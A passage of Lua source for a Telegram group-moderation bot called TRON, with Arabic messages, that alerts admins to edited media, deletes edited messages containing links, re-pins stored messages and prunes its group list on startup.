elseif result.content_.ID == "MessageVideo" then Media = 'الفيديو'
elseif result.content_.ID == "MessageAnimation" then Media = 'المتحركه'
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,dp) 
local Abdname = '⌁︙العضو ↫ ['..dp.first_name_..'](tg://user?id='..dp.id_..')'
local Abdid = '⌁︙ايديه ↫ `'..dp.id_..'`'
local Abdtext = '⌁︙قام بالتعديل على '..Media
local Abdtxt = '┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙تعالو يامشرفين اكو مخرب'
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,abbas) 
local admins = abbas.members_  
text = '\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
for i=0 , #admins do 
if not abbas.members_[i].bot_info_ then
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,data) 
if data.first_name_ ~= false then
text = text.."~ [@"..data.username_.."]\n"
end
if #admins == i then 
SendText(msg.chat_id_, Abdname..'\n'..Abdid..'\n'..Abdtext..text..Abdtxt,0,'md') 
end
end,nil)
end
end
end,nil)
end,nil)
end
if not VipMem(result) then
Filters(result, text)
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") or text:match("#") or text:match("@") or text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match("[Ww][Ww][Ww].") or text:match(".[Xx][Yy][Zz]") then
if DevAbd:get(TRON..'Abd:Lock:EditMsgs'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
end end end 
end,nil)
--     Source TRON     --
elseif (data.ID == "UpdateMessageSendSucceeded") then
local msg = data.message_
local text = msg.content_.text_
local GetMsgPin = DevAbd:get(TRON..'Abd:PinnedMsgs'..msg.chat_id_)
if GetMsgPin ~= nil then
if text == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) if dp.ID == 'Ok' then;DevAbd:del(TRON..'Abd:PinnedMsgs'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if GetMsgPin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevAbd:del(TRON..'Abd:PinnedMsgs'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
if msg.content_.animation_.animation_.persistent_id_ == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevAbd:del(TRON..'Abd:PinnedMsgs'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.photo_) then
if msg.content_.photo_.sizes_[0] then
id_photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
id_photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
id_photo = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
id_photo = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
if id_photo == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevAbd:del(TRON..'Abd:PinnedMsgs'..msg.chat_id_) end,nil)   
end end end
--     Source TRON     --
elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then
print('\27[30;32mجاري تنظيف المجموعات الوهميه يرجى الانتظار\n\27[1;37m')
local PvList = DevAbd:smembers(TRON..'Abd:Users')  
for k,v in pairs(PvList) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
end 
local GpList = DevAbd:smembers(TRON..'Abd:Groups') 
for k,v in pairs(GpList) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
tdcli_function({ID = "ChangeChatMemberStatus",chat_id_=v,user_id_=TRON,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
DevAbd:srem(TRON..'Abd:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
DevAbd:srem(TRON..'Abd:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
DevAbd:srem(TRON..'Abd:Groups',v)  
end
if data and data.code_ and data.code_ == 400 then
DevAbd:srem(TRON..'Abd:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusEditor" then
DevAbd:sadd(TRON..'Abd:Groups',v)  
end end,nil) end
end
--     Source TRON     --
end 
------------------------------------------------
-- This Source Was Developed By (Abd) @LEEEE9.--
--   This Is The Source Channel @YYYYAX .   --
--                - TRON -                 --
--        -- https://t.me/YYYYAX --         --
------------------------------------------------ 
